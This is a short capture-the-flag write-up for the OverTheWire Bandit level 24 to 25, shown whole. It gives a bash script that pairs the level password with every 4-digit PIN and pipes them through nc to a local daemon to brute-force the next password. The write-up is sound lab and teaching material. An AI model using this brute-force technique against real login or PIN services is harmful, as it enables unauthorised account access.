# Bandit 24 -> 25
 - A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. 
 -There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
 -You do not need to create new connections each time

## Commands
``` bash
 cd /tmp/mine/
 cat << 'EOF' > brute.sh
#!/bin/bash

# Define your level 24 password
PASSWORD="<pswd_here>"

# Loop from 0 to 9999
for pin in {0000..9999}; do
    echo "$PASSWORD $pin"
done
EOF
 chmod +x brute.sh
 ./brute.sh | head -n 5
 ./brute.sh | nc localhost 30002
```

## Observations and Mistakes
 - We used the head -n 5 to make sure our file has the actual stuff we need to see after executing it
 - usage of nc allowed for a comparetively faster brute forcing
